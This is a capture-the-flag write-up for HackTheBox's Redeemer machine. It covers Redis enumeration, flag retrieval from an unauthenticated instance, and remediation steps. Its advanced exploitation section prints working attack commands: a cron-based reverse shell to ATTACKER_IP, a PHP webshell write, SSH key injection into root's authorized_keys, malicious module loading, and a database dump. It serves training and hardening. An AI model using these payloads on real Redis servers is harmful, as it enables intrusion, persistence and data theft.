# Redeemer - HackTheBox Starting Point (Tier 0)

<div align="center">

![Difficulty](https://img.shields.io/badge/Difficulty-Very%20Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux)
![Points](https://img.shields.io/badge/Points-10-orange?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Pwned-success?style=for-the-badge)

**Redis Database Exploitation | NoSQL Security | In-Memory Database**

</div>

---

## 📋 Machine Information

| Attribute | Details |
|-----------|---------|
| **Machine Name** | Redeemer |
| **IP Address** | 10.129.71.103 |
| **Operating System** | Linux |
| **Difficulty** | ⭐ Very Easy |
| **Release Date** | 2021 |
| **Pwned Date** | 05 January 2026 |
| **Player Rank** | #286759 |
| **Machine Type** | Starting Point - Tier 0 |
| **Primary Attack Vector** | Misconfigured Redis Database |
| **Required Tools** | nmap, redis-cli |
| **Flags** | 1 (root flag) |

---

## 🎯 Learning Objectives

This machine teaches fundamental concepts about NoSQL databases and Redis security:

- ✅ **Redis Protocol**: Understanding Redis server architecture and default port (6379)
- ✅ **NoSQL Databases**: Learning about in-memory key-value data stores
- ✅ **redis-cli**: Command-line utility for Redis interaction
- ✅ **Database Enumeration**: Selecting databases and listing keys
- ✅ **Misconfiguration Exploitation**: Accessing unsecured Redis instances
- ✅ **Security Best Practices**: Redis authentication and network protection

---

## 📚 Guided Tasks (10 Questions)

### Task 1: Default Redis Port

**Question:** Which TCP port is open on the machine?

**Answer:** `6379`

**Explanation:**
Redis uses TCP port **6379** as its default port. This is a well-known port that can be easily identified during network reconnaissance. Redis (Remote Dictionary Server) is an open-source, in-memory data structure store used as a database, cache, and message broker.

**Discovery Command:**
```bash
nmap -p- <target_ip>
# or more specifically
nmap -p 6379 <target_ip>
```

**Why This Matters:**
- Port 6379 is the standard Redis port (registered with IANA)
- Attackers commonly scan for this port to find exposed Redis instances
- Redis instances exposed to the internet are high-value targets
- Default ports make services easier to identify during reconnaissance

---

### Task 2: Service Name

**Question:** Which service is running on the port that is open on the machine?

**Answer:** `redis`

**Explanation:**
The service running on port 6379 is **Redis** (Remote Dictionary Server). Redis is an open-source, in-memory data structure store that can be used as a database, cache, message broker, and queue. It supports various data structures including strings, hashes, lists, sets, sorted sets, bitmaps, and streams.

**Service Detection:**
```bash
nmap -sV -p 6379 <target_ip>
```

**Example Output:**
```
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

**Redis Characteristics:**
- **Speed**: Extremely fast due to in-memory storage
- **Persistence**: Optional disk persistence with snapshots or append-only files
- **Replication**: Master-slave replication support
- **High Availability**: Redis Sentinel for automatic failover
- **Clustering**: Distributed implementation for scalability

---

### Task 3: Database Type

**Question:** What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database

**Answer:** `In-memory Database`

**Explanation:**
Redis is an **in-memory database**, which means all data is stored in RAM (Random Access Memory) rather than on disk. This design choice provides several advantages and trade-offs:

**Advantages of In-Memory Databases:**
- **Extreme Speed**: RAM access is orders of magnitude faster than disk I/O
- **Low Latency**: Sub-millisecond response times for most operations
- **High Throughput**: Can handle hundreds of thousands of operations per second
- **Simple Data Structures**: Optimized for key-value operations

**Trade-offs:**
- **Volatility**: Data can be lost if Redis crashes (unless persistence is configured)
- **Memory Limits**: Data set size limited by available RAM
- **Cost**: RAM is more expensive per GB than disk storage
- **Persistence Overhead**: Optional disk snapshots add complexity

**Comparison with Traditional Databases:**

| Feature | In-Memory (Redis) | Traditional (MySQL/PostgreSQL) |
|---------|-------------------|-------------------------------|
| Storage Location | RAM | Disk |
| Read Speed | Sub-millisecond | Milliseconds to seconds |
| Write Speed | Sub-millisecond | Milliseconds (with caching) |
| Data Persistence | Optional | Default |
| Data Size Limit | RAM capacity | Disk capacity |
| Use Case | Caching, sessions, queues | Persistent application data |

**Common Redis Use Cases:**
- Session storage for web applications
- Cache layer for database queries
- Real-time analytics and leaderboards
- Message queuing and pub/sub systems
- Rate limiting and counting
- Geospatial data indexing

---

### Task 4: Command-Line Utility

**Question:** Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.

**Answer:** `redis-cli`

**Explanation:**
**redis-cli** (Redis Command Line Interface) is the official command-line client for Redis. It provides an interactive shell for executing Redis commands and managing the database.

**Basic Usage:**
```bash
# Connect to local Redis server (default: localhost:6379)
redis-cli

# Connect to remote Redis server
redis-cli -h <hostname>

# Connect with authentication
redis-cli -h <hostname> -a <password>

# Connect to specific port
redis-cli -h <hostname> -p <port>

# Execute single command and exit
redis-cli -h <hostname> PING
```

**redis-cli Features:**
- **Interactive Mode**: REPL (Read-Eval-Print Loop) shell
- **Batch Mode**: Execute commands from files or standard input
- **CSV Output**: Export data in CSV format
- **Statistics Mode**: Monitor Redis server statistics in real-time
- **Latency Testing**: Built-in latency measurement tools
- **Cluster Support**: Connect to Redis Cluster nodes

**Alternative Redis Clients:**
- **GUI Tools**: RedisInsight, Redis Desktop Manager, Medis
- **Programming Libraries**: redis-py (Python), node-redis (Node.js), Jedis (Java)
- **Web Interfaces**: phpRedisAdmin
- **CLI Alternatives**: redis-commander, iredis (enhanced CLI)

**Common redis-cli Commands:**
```bash
# Test connectivity
PING

# Get server information
INFO

# List all databases
INFO keyspace

# Select database
SELECT 0

# List all keys
KEYS *

# Get value by key
GET <key>

# Set key-value pair
SET <key> <value>

# Delete key
DEL <key>
```

---

### Task 5: Hostname Flag

**Question:** Which flag is used with the Redis command-line utility to specify the hostname?

**Answer:** `-h`

**Explanation:**
The **-h** flag specifies the hostname or IP address of the Redis server you want to connect to. This is essential when connecting to remote Redis instances that are not running on localhost.

**Flag Usage:**
```bash
redis-cli -h <hostname_or_ip>

# Examples:
redis-cli -h 10.129.71.103
redis-cli -h redis.example.com
redis-cli -h 192.168.1.100
```

**Common redis-cli Flags:**

| Flag | Purpose | Example |
|------|---------|---------|
| `-h` | Hostname or IP address | `redis-cli -h 10.10.10.10` |
| `-p` | Port number | `redis-cli -p 6380` |
| `-a` | Password for authentication | `redis-cli -a mypassword` |
| `-n` | Database number (0-15) | `redis-cli -n 2` |
| `-u` | URI connection string | `redis-cli -u redis://user:pass@host:port/db` |
| `--raw` | Force raw output (no formatting) | `redis-cli --raw` |
| `--csv` | Output in CSV format | `redis-cli --csv` |
| `--stat` | Show rolling stats | `redis-cli --stat` |
| `--latency` | Test latency | `redis-cli --latency` |

**Complete Connection Example:**
```bash
# Connect to remote Redis with all parameters
redis-cli -h 10.129.71.103 -p 6379 -n 0

# After connection, you'll see:
10.129.71.103:6379>
```

**Why Hostname Specification Matters:**
- **Remote Access**: Connect to Redis servers on other machines
- **Multiple Instances**: Distinguish between different Redis servers
- **Network Segmentation**: Access Redis across different network zones
- **Cloud Deployments**: Connect to managed Redis services (AWS ElastiCache, Azure Cache)

---

### Task 6: Info Command

**Question:** Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?

**Answer:** `info`

**Explanation:**
The **INFO** command returns comprehensive information and statistics about the Redis server. This command is invaluable for enumeration, performance monitoring, and troubleshooting.

**Basic Usage:**
```bash
# Get all information
INFO

# Get specific section
INFO server
INFO stats
INFO replication
INFO cpu
INFO memory
INFO keyspace
```

**INFO Command Sections:**

1. **Server**: General server information
   - Redis version
   - Operating system
   - Process ID
   - TCP port
   - Uptime

2. **Clients**: Connected client statistics
   - Number of connected clients
   - Blocked clients
   - Client longest output list

3. **Memory**: Memory usage statistics
   - Used memory (human-readable)
   - Peak memory usage
   - Memory fragmentation ratio
   - Memory allocator (jemalloc/tcmalloc)

4. **Persistence**: RDB and AOF persistence information
   - Last save time
   - Changes since last save
   - Background save status

5. **Stats**: General statistics
   - Total connections received
   - Total commands processed
   - Rejected connections
   - Expired keys

6. **Replication**: Master-slave replication status
   - Role (master/slave)
   - Connected slaves
   - Replication offset

7. **CPU**: CPU usage statistics
   - Used CPU (sys/user)
   - Background save CPU

8. **Keyspace**: Database key statistics
   - Number of keys per database
   - Keys with expiration
   - Average TTL

**Example INFO Output:**
```
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-104-generic x86_64
arch_bits:64
multiplexing_api:epoll
tcp_port:6379
uptime_in_seconds:3600
uptime_in_days:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

**Security Implications:**
- **Information Disclosure**: INFO reveals server version, OS, configuration
- **Enumeration**: Attackers use INFO to understand database structure
- **Version Detection**: Helps identify known vulnerabilities
- **Best Practice**: Disable INFO command in production or require authentication

**Alternative Commands:**
- `CONFIG GET *` - Get all configuration parameters (requires admin)
- `CLIENT LIST` - List all connected clients
- `DBSIZE` - Get number of keys in current database
- `MEMORY STATS` - Detailed memory usage (Redis 4.0+)

---

### Task 7: Redis Version

**Question:** What is the version of the Redis server being used on the target machine?

**Answer:** `5.0.7`

**Explanation:**
The Redis server version is **5.0.7**, which can be discovered through the INFO command or nmap service detection. Knowing the exact version is crucial for security assessment and exploit development.

**Version Detection Methods:**

**Method 1: INFO Command**
```bash
redis-cli -h <target_ip>
> INFO server
# Look for: redis_version:5.0.7
```

**Method 2: nmap Service Scan**
```bash
nmap -sV -p 6379 <target_ip>
# Output: redis   Redis key-value store 5.0.7
```

**Method 3: Direct Version Query**
```bash
redis-cli -h <target_ip> INFO server | grep redis_version
# Output: redis_version:5.0.7
```

**Redis 5.0.7 - Release Information:**
- **Release Date**: May 2019 (5.0.0), May 2020 (5.0.7 patch)
- **Major Version**: 5.0 (stable release)
- **Patch Level**: 7 (bug fixes and security updates)
- **Support Status**: Legacy (Redis 7.x is current as of 2024)

**Redis 5.0 Key Features:**
- **Streams**: New data type for message queuing
- **Sorted Set Blocking Operations**: ZPOPMIN, ZPOPMAX with blocking
- **Active Defragmentation**: Automatic memory fragmentation reduction
- **HyperLogLog Improvements**: Better memory efficiency
- **New Commands**: LOLWUT (Easter egg), various stream commands

**Security Considerations for 5.0.7:**

**Known Vulnerabilities (Example):**
- Check CVE database for specific 5.0.7 vulnerabilities
- Older versions may have unpatched security issues
- Unauthenticated access is the primary risk

**Version Upgrade Recommendations:**
```
Current: Redis 5.0.7 (2020)
   ↓
Upgrade Path:
   → Redis 6.0.x (ACL support, SSL/TLS)
   → Redis 6.2.x (Long-term support)
   → Redis 7.0.x (Latest stable)
   → Redis 7.2.x (Current)
```

**Why Version Matters:**
- **Exploit Availability**: Public exploits target specific versions
- **Feature Support**: Newer versions have better security features
- **Performance**: Each version improves efficiency
- **Compatibility**: Client libraries may require minimum versions

---

### Task 8: Database Selection

**Question:** Which command is used to select the desired database in Redis?

**Answer:** `select`

**Explanation:**
The **SELECT** command switches the current connection to a different logical database within the Redis instance. By default, Redis supports 16 databases (numbered 0-15), though this can be configured.

**Command Syntax:**
```bash
SELECT <database_number>

# Examples:
SELECT 0  # Switch to database 0 (default)
SELECT 1  # Switch to database 1
SELECT 15 # Switch to database 15 (last default DB)
```

**Redis Database Architecture:**

**Logical Separation:**
```
Redis Instance (Single Process)
├── Database 0 (default)
│   ├── key1: value1
│   ├── key2: value2
│   └── ...
├── Database 1
│   ├── session:abc: {...}
│   ├── session:def: {...}
│   └── ...
├── Database 2
│   ├── cache:user:123: {...}
│   └── ...
└── ...
└── Database 15
    └── ...
```

**Key Characteristics:**
- **Same Process**: All databases run in the same Redis instance
- **Shared Memory**: Memory is shared across all databases
- **No Isolation**: Not truly isolated like MySQL databases
- **No Authentication Per DB**: AUTH applies to entire instance
- **Performance**: SELECT is instant (O(1) operation)

**Common Database Usage Patterns:**

| Database | Common Use Case |
|----------|----------------|
| 0 | Default application data |
| 1 | Session storage |
| 2 | Cache layer |
| 3 | Message queues |
| 4 | Rate limiting |
| 5-15 | Environment separation (dev/staging/test) |

**Complete Enumeration Workflow:**
```bash
# Connect to Redis
redis-cli -h <target_ip>

# Check which databases have keys
INFO keyspace

# Example output:
# db0:keys=4,expires=0,avg_ttl=0
# db1:keys=10,expires=5,avg_ttl=3600

# Select database 0
SELECT 0

# List all keys in database 0
KEYS *

# Select database 1
SELECT 1

# List all keys in database 1
KEYS *
```

**Configuration:**
The number of databases can be configured in redis.conf:
```
databases 16  # Default value
```

**Best Practices:**
- **Don't use SELECT in production**: Use separate Redis instances instead
- **Why?** Because:
  - All databases share memory (no resource isolation)
  - FLUSHALL deletes ALL databases
  - No per-database authentication
  - Makes backup/restore complex
  - Confusing for large teams

**Modern Alternative:**
Instead of using SELECT, modern deployments use:
- **Multiple Redis Instances**: One per environment/application
- **Redis Cluster**: Distributed sharding across nodes
- **Key Prefixes**: `app1:user:123`, `app2:user:456` in same database

---

### Task 9: Key Count

**Question:** How many keys are present inside the database with index 0?

**Answer:** `4`

**Explanation:**
Database 0 contains **4 keys**. This can be discovered through the INFO keyspace command or by selecting the database and using KEYS or DBSIZE.

**Discovery Methods:**

**Method 1: INFO keyspace**
```bash
redis-cli -h <target_ip>
> INFO keyspace

# Output:
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

**Interpretation:**
- `keys=4` → 4 keys in database 0
- `expires=0` → No keys have expiration (TTL) set
- `avg_ttl=0` → Average time-to-live is 0 (permanent keys)

**Method 2: SELECT + DBSIZE**
```bash
redis-cli -h <target_ip>
> SELECT 0
OK
> DBSIZE
(integer) 4
```

**Method 3: SELECT + KEYS count**
```bash
redis-cli -h <target_ip>
> SELECT 0
OK
> KEYS *
1) "key1"
2) "key2"
3) "key3"
4) "flag"

# Count manually: 4 keys
```

**DBSIZE vs KEYS *:**

| Command | Purpose | Performance | Production Safe? |
|---------|---------|-------------|------------------|
| `DBSIZE` | Count keys | O(1) - Instant | ✅ Yes |
| `KEYS *` | List all keys | O(N) - Slow | ❌ No (blocks server) |

**Why KEYS * is Dangerous in Production:**
- **Blocking Operation**: Redis is single-threaded; KEYS blocks all operations
- **Performance Impact**: On large databases, can take seconds/minutes
- **Denial of Service**: Can make Redis unresponsive
- **Better Alternative**: SCAN command (non-blocking, cursor-based)

**Safe Key Enumeration with SCAN:**
```bash
# SCAN returns cursor and batch of keys
SCAN 0 MATCH * COUNT 100

# Example output:
1) "17"         # Next cursor (0 = complete)
2) 1) "key1"    # Keys found
   2) "key2"
   3) "key3"
   4) "flag"

# Continue scanning with next cursor
SCAN 17 MATCH * COUNT 100
```

**Practical Enumeration Strategy:**
```bash
# 1. Check which databases exist
INFO keyspace

# 2. For each database with keys:
SELECT 0
DBSIZE  # Get count

# 3. List keys (use SCAN in production)
SCAN 0 MATCH * COUNT 1000

# 4. Examine interesting keys
TYPE <key>       # Check data type
GET <key>        # Get value (if string)
HGETALL <key>    # Get all fields (if hash)
LRANGE <key> 0 -1  # Get all items (if list)
```

**Key Naming Patterns to Look For:**
- `flag` → Capture the flag challenges
- `user:*` → User data
- `session:*` → Session tokens
- `admin:*` → Administrative data
- `password` → Credentials
- `config:*` → Configuration data
- `backup:*` → Backup data

---

### Task 10: List All Keys

**Question:** Which command is used to obtain all the keys in a database?

**Answer:** `keys *`

**Explanation:**
The **KEYS** command with the `*` wildcard pattern returns all keys in the currently selected database. While simple and effective for enumeration, this command has significant performance implications in production environments.

**Command Syntax:**
```bash
KEYS pattern

# Examples:
KEYS *              # All keys
KEYS user:*         # All keys starting with "user:"
KEYS *session*      # All keys containing "session"
KEYS user:?00       # user:100, user:200, etc.
KEYS user:[abc]*    # user:a*, user:b*, user:c*
```

**Pattern Matching Wildcards:**

| Pattern | Meaning | Example | Matches |
|---------|---------|---------|---------|
| `*` | Any characters (0 or more) | `KEYS user:*` | user:1, user:admin, user:abc |
| `?` | Single character | `KEYS user:?` | user:1, user:a (not user:10) |
| `[abc]` | Any character in brackets | `KEYS user:[123]` | user:1, user:2, user:3 |
| `[a-z]` | Any character in range | `KEYS user:[a-z]` | user:a, user:b, ... user:z |
| `[^a]` | Any character NOT in brackets | `KEYS user:[^1]` | user:2, user:a (not user:1) |

**Complete Enumeration Example:**
```bash
redis-cli -h 10.129.71.103

# Select database 0
10.129.71.103:6379> SELECT 0
OK

# List all keys
10.129.71.103:6379> KEYS *
1) "numb"
2) "flag"
3) "stor"
4) "temp"

# Check key types
10.129.71.103:6379> TYPE flag
string

# Get flag value
10.129.71.103:6379> GET flag
"[REDACTED]"
```

**Performance Considerations:**

**KEYS * Problems:**
- **Time Complexity**: O(N) where N = number of keys
- **Blocking**: Halts all other operations during execution
- **Memory**: Stores all matching keys in memory
- **Impact**: On 1M keys, can take seconds and block production traffic

**Example Impact:**
```
Database Size       KEYS * Execution Time    Impact
--------------      ----------------------   ------
1,000 keys          ~1ms                     Minimal
10,000 keys         ~10ms                    Noticeable
100,000 keys        ~100ms                   Significant
1,000,000 keys      ~1-2 seconds             Production outage
10,000,000 keys     ~10-20 seconds           Complete service disruption
```

**Safe Alternative: SCAN Command**
```bash
# SCAN returns cursor + batch of keys
SCAN 0 MATCH * COUNT 100

# Output format:
1) "cursor"     # Next cursor (0 = done)
2) 1) "key1"    # Batch of keys
   2) "key2"
   ...

# Advantages:
# - Non-blocking (returns control after each batch)
# - Cursor-based (can pause and resume)
# - Memory-efficient (processes batches)
# - Production-safe
```

**Complete SCAN Enumeration Script:**
```bash
#!/bin/bash
cursor=0
while true; do
    # Execute SCAN with current cursor
    result=$(redis-cli -h <target_ip> SCAN $cursor MATCH * COUNT 1000)
    
    # Extract new cursor (first line)
    cursor=$(echo "$result" | head -n 1)
    
    # Extract and display keys (remaining lines)
    echo "$result" | tail -n +2
    
    # Exit if cursor is 0 (complete)
    [[ "$cursor" == "0" ]] && break
done
```

**Other Key Discovery Commands:**

| Command | Purpose | Complexity | Blocking? |
|---------|---------|------------|-----------|
| `KEYS pattern` | Match keys by pattern | O(N) | ✅ Yes |
| `SCAN cursor [MATCH pattern]` | Iterate keys safely | O(1) per call | ❌ No |
| `RANDOMKEY` | Get random key | O(1) | ❌ No |
| `EXISTS key` | Check if key exists | O(1) | ❌ No |
| `TYPE key` | Get key data type | O(1) | ❌ No |

**Examining Key Values:**

Once you have key names, retrieve values based on type:

```bash
# String type
GET key

# Hash type
HGETALL key
HKEYS key          # Just field names
HVALS key          # Just values

# List type
LRANGE key 0 -1    # All elements
LLEN key           # List length

# Set type
SMEMBERS key       # All members
SCARD key          # Set size

# Sorted Set type
ZRANGE key 0 -1 WITHSCORES

# Stream type (Redis 5.0+)
XRANGE key - +
```

**Best Practices:**
1. **Development/Testing**: `KEYS *` is fine
2. **Production**: Always use `SCAN` instead
3. **Enumeration**: Start with `INFO keyspace` to see database sizes
4. **Rate Limiting**: If using KEYS, ensure database is small (<10k keys)
5. **Monitoring**: Watch for slow queries (`SLOWLOG GET`)

---

## 🔍 Complete Methodology

### Phase 1: Reconnaissance

**Objective:** Identify open ports and services on the target machine.

**Step 1.1: Initial Ping Sweep**
```bash
# Verify target is online
ping -c 4 10.129.71.103

# Expected: Reply from 10.129.71.103 with low latency
```

**Step 1.2: Full Port Scan**
```bash
# Quick scan of common ports
nmap -F 10.129.71.103

# Comprehensive scan of all ports
nmap -p- 10.129.71.103

# Output:
# PORT     STATE SERVICE
# 6379/tcp open  redis
```

**Step 1.3: Service Version Detection**
```bash
# Detailed service enumeration
nmap -sV -sC -p 6379 10.129.71.103

# Flags explained:
# -sV : Service version detection
# -sC : Default script scan
# -p 6379 : Specific port

# Output:
# PORT     STATE SERVICE VERSION
# 6379/tcp open  redis   Redis key-value store 5.0.7
```

**Step 1.4: OS Detection (Optional)**
```bash
# Identify operating system
sudo nmap -O 10.129.71.103

# Output: Linux 5.x kernel
```

**Reconnaissance Findings:**
- ✅ Port 6379 is open (Redis default port)
- ✅ Service: Redis key-value store version 5.0.7
- ✅ Operating System: Linux
- ✅ No authentication required (vulnerable!)

---

### Phase 2: Enumeration

**Objective:** Gather detailed information about the Redis service and database contents.

**Step 2.1: Test Redis Connectivity**
```bash
# Attempt connection
redis-cli -h 10.129.71.103

# Successful connection prompt:
10.129.71.103:6379>
```

**Step 2.2: Test Authentication**
```bash
# Test if authentication is required
10.129.71.103:6379> PING
PONG

# PONG response = No authentication required (MAJOR SECURITY ISSUE!)
```

**Step 2.3: Gather Server Information**
```bash
# Get comprehensive server details
10.129.71.103:6379> INFO

# Key information extracted:
# redis_version:5.0.7
# os:Linux 5.4.0-104-generic x86_64
# tcp_port:6379
# uptime_in_seconds:3600
```

**Step 2.4: Enumerate Databases**
```bash
# Check which databases contain keys
10.129.71.103:6379> INFO keyspace

# Output:
# db0:keys=4,expires=0,avg_ttl=0

# Analysis:
# - Only database 0 has keys
# - 4 keys total
# - No expiration set on any keys
```

**Step 2.5: Select and Enumerate Database 0**
```bash
# Switch to database 0
10.129.71.103:6379> SELECT 0
OK

# Count keys
10.129.71.103:6379> DBSIZE
(integer) 4

# List all keys
10.129.71.103:6379> KEYS *
1) "numb"
2) "flag"
3) "stor"
4) "temp"
```

**Step 2.6: Identify Key Types**
```bash
# Check data type of each key
10.129.71.103:6379> TYPE numb
string

10.129.71.103:6379> TYPE flag
string

10.129.71.103:6379> TYPE stor
string

10.129.71.103:6379> TYPE temp
string

# All keys are simple string type
```

**Enumeration Summary:**
- ✅ Unauthenticated access confirmed
- ✅ Redis version 5.0.7 (known vulnerabilities may exist)
- ✅ Database 0 contains 4 string keys
- ✅ Key named "flag" identified (likely contains the flag)
- ✅ No other databases in use

---

### Phase 3: Exploitation

**Objective:** Retrieve sensitive data from the misconfigured Redis database.

**Step 3.1: Retrieve Flag**
```bash
# Get the value of the "flag" key
10.129.71.103:6379> GET flag
"[REDACTED]"

# Flag format: 32 hexadecimal characters (MD5-like hash)
```

**Step 3.2: Examine Other Keys (Optional Enumeration)**
```bash
# Check other keys for additional information
10.129.71.103:6379> GET numb
"[REDACTED]"

10.129.71.103:6379> GET stor
"[REDACTED]"

10.129.71.103:6379> GET temp
"[REDACTED]"
```

**Step 3.3: Advanced Exploitation Techniques (Beyond This Machine)**

While not required for Redeemer, unsecured Redis instances can be exploited in multiple ways:

**1. Webshell Upload (If Web Server Accessible)**
```bash
# Set cron job to create reverse shell (Linux)
config set dir /var/spool/cron/
config set dbfilename root
set xxx "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
save

# Save PHP webshell (if webroot is writable)
config set dir /var/www/html
config set dbfilename shell.php
set xxx "<?php system($_GET['cmd']); ?>"
save
```

**2. SSH Key Injection (If User Home Accessible)**
```bash
# Write SSH public key to authorized_keys
config set dir /root/.ssh/
config set dbfilename authorized_keys
set xxx "\n\n\nssh-rsa AAAAB3... attacker@kali\n\n\n"
save

# Now can SSH as root without password
ssh -i id_rsa root@target_ip
```

**3. Module Loading (Redis 4.0+)**
```bash
# Load malicious Redis module for RCE
MODULE LOAD /path/to/evil.so

# Execute system commands through module
evil.exec "whoami"
```

**4. Lua Sandbox Escape (Older Versions)**
```bash
# Execute Lua code (pre-5.0 vulnerabilities)
EVAL "return redis.call('config','set','dir','/var/www/html')" 0
```

**5. Data Exfiltration**
```bash
# Dump entire database
redis-cli -h target_ip --rdb dump.rdb

# Parse dump file for sensitive data
strings dump.rdb | grep -i password
```

**Why This Machine is Vulnerable:**
- ❌ **No Authentication**: AUTH not required (protected-mode disabled)
- ❌ **No Firewall**: Port 6379 exposed to internet
- ❌ **No Binding Restriction**: Accepts connections from any IP
- ❌ **No TLS Encryption**: All traffic in cleartext
- ❌ **No Command Renaming**: Dangerous commands like CONFIG enabled

**Exploitation Summary:**
- ✅ Flag retrieved successfully from "flag" key
- ✅ Full database access achieved
- ✅ No authentication bypass required (already open)
- ✅ Complete control over Redis data

---

## 🛡️ Security Analysis

### Vulnerability: Unauthenticated Redis Access

**CVSS Score:** 9.8 (Critical)

**Vulnerability Classification:**
- **CWE-306**: Missing Authentication for Critical Function
- **CWE-284**: Improper Access Control
- **OWASP**: A1:2021 - Broken Access Control

**Attack Vector:**
```
Network → Port 6379 (Open) → Redis Service (No Auth) → Full Database Access
```

**Risk Assessment:**

| Risk Factor | Rating | Justification |
|-------------|--------|---------------|
| **Exploitability** | 🔴 High | No authentication required; trivial to exploit |
| **Impact** | 🔴 Critical | Complete data access; potential RCE |
| **Affected Assets** | 🔴 Critical | All data in Redis; potentially entire server |
| **Detection** | 🟢 Easy | Easily detected by security scanners |
| **Remediation** | 🟢 Easy | Enable requirepass; bind to localhost |

---

### Attack Scenarios

**Scenario 1: Data Breach**
```
Attacker Goal: Steal sensitive data (sessions, user info, credentials)

Attack Flow:
1. Scan for open Redis ports (6379)
2. Connect without authentication
3. Enumerate all databases (INFO keyspace)
4. Extract all keys (KEYS *)
5. Download entire database (SAVE + retrieve dump.rdb)
6. Parse dump for sensitive data

Impact: 
- Customer PII exposed
- Session tokens stolen (account takeover)
- API keys leaked
- Passwords revealed (if stored)
```

**Scenario 2: Remote Code Execution**
```
Attacker Goal: Gain shell access to server

Attack Flow:
1. Connect to unprotected Redis
2. Identify writable directories (try /var/www, /home/user, etc.)
3. Write webshell or SSH key using CONFIG SET
4. Access webshell or SSH in
5. Escalate privileges (sudo, kernel exploit)

Impact:
- Full server compromise
- Lateral movement to other systems
- Data destruction
- Ransomware deployment
```

**Scenario 3: Denial of Service**
```
Attacker Goal: Disrupt service availability

Attack Flow:
1. Connect to Redis
2. Execute FLUSHALL (delete all data)
3. Execute DEBUG SEGFAULT (crash Redis)
4. Fill memory with large keys (OOM crash)

Impact:
- Service outage
- Data loss
- Revenue loss
- Customer trust damage
```

**Scenario 4: Cryptomining**
```
Attacker Goal: Use server resources for cryptocurrency mining

Attack Flow:
1. Gain RCE through Redis (SSH key injection)
2. Download and execute mining software
3. Use cron job for persistence
4. Throttle CPU usage to avoid detection

Impact:
- Increased cloud costs
- Degraded performance
- Potential detection/ban by cloud provider
```

---

### Real-World Impact

**Notable Redis Security Incidents:**

1. **2020: Redis Ransomware Campaign**
   - 8,000+ unprotected Redis instances encrypted
   - Ransom demanded in Bitcoin
   - Data loss for victims who didn't pay

2. **2021: Redis RCE via CVE-2021-32672**
   - Lua sandbox escape vulnerability
   - Affected Redis < 6.2.6
   - Remote code execution possible

3. **2019: Meow Attacks**
   - Automated deletion of unsecured databases
   - 1,000+ Redis, MongoDB, Elasticsearch instances wiped
   - No ransom; pure destruction

**Common Redis Misconfigurations:**

| Misconfiguration | Prevalence | Risk | Easy Fix? |
|------------------|------------|------|-----------|
| No password (`requirepass` not set) | 🔴 Very Common | 🔴 Critical | ✅ Yes |
| Bind to 0.0.0.0 (all interfaces) | 🔴 Common | 🔴 Critical | ✅ Yes |
| Protected mode disabled | 🟡 Moderate | 🔴 Critical | ✅ Yes |
| Dangerous commands enabled | 🟡 Moderate | 🟠 High | ✅ Yes |
| No TLS/SSL encryption | 🔴 Very Common | 🟠 High | 🟡 Medium |
| No firewall rules | 🟡 Moderate | 🔴 Critical | ✅ Yes |

---

## 🔧 Remediation

### Immediate Actions (Critical Priority)

**1. Enable Authentication**
```bash
# Edit redis.conf
requirepass YourStrongPasswordHere123!@#

# Restart Redis
sudo systemctl restart redis

# Test authentication
redis-cli -h localhost
> PING
(error) NOAUTH Authentication required.

> AUTH YourStrongPasswordHere123!@#
OK
> PING
PONG
```

**Password Requirements:**
- Minimum 32 characters
- Mix of uppercase, lowercase, numbers, symbols
- Randomly generated (not dictionary words)
- Example: `openssl rand -base64 32`

---

**2. Bind to Localhost Only**
```bash
# Edit redis.conf
bind 127.0.0.1 ::1

# Or bind to specific internal IP
bind 10.0.1.10

# Restart Redis
sudo systemctl restart redis

# Verify binding
sudo netstat -tlnp | grep redis
# Should show: 127.0.0.1:6379 (NOT 0.0.0.0:6379)
```

---

**3. Enable Protected Mode**
```bash
# Edit redis.conf (should be default)
protected-mode yes

# This prevents external connections if:
# - No bind directive is set
# - No password is configured
```

---

**4. Implement Firewall Rules**
```bash
# Ubuntu/Debian (ufw)
sudo ufw deny 6379/tcp
sudo ufw allow from 10.0.1.0/24 to any port 6379  # Only internal network

# CentOS/RHEL (firewalld)
sudo firewall-cmd --permanent --remove-port=6379/tcp
sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="10.0.1.0/24" port port="6379" protocol="tcp" accept'
sudo firewall-cmd --reload

# iptables
sudo iptables -A INPUT -p tcp --dport 6379 -s 10.0.1.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 6379 -j DROP
```

---

### Secondary Hardening (High Priority)

**5. Rename Dangerous Commands**
```bash
# Edit redis.conf
rename-command FLUSHDB ""          # Disable completely
rename-command FLUSHALL ""         # Disable completely
rename-command CONFIG "CONFIG_a8f5b2d9c3e7"  # Rename to random string
rename-command SHUTDOWN ""         # Disable
rename-command DEBUG ""            # Disable
rename-command MODULE ""           # Disable (Redis 4.0+)
rename-command KEYS "KEYS_x9k2m4n8"  # Rename (force using SCAN)

# Restart Redis
sudo systemctl restart redis
```

**Usage After Renaming:**
```bash
# Old command no longer works
CONFIG GET *
(error) ERR unknown command 'CONFIG'

# Use renamed version
CONFIG_a8f5b2d9c3e7 GET *
# Works with auth
```

---

**6. Enable TLS/SSL Encryption (Redis 6.0+)**
```bash
# Generate certificates
openssl req -x509 -nodes -newkey rsa:4096 \
  -keyout redis.key -out redis.crt -days 365

# Edit redis.conf
port 0                          # Disable non-TLS
tls-port 6379                   # Enable TLS port
tls-cert-file /path/to/redis.crt
tls-key-file /path/to/redis.key
tls-ca-cert-file /path/to/ca.crt
tls-auth-clients yes            # Require client certificates

# Restart Redis
sudo systemctl restart redis

# Connect with TLS
redis-cli --tls \
  --cert /path/to/client.crt \
  --key /path/to/client.key \
  --cacert /path/to/ca.crt
```

---

**7. Implement Access Control Lists (Redis 6.0+)**
```bash
# Create users with limited permissions
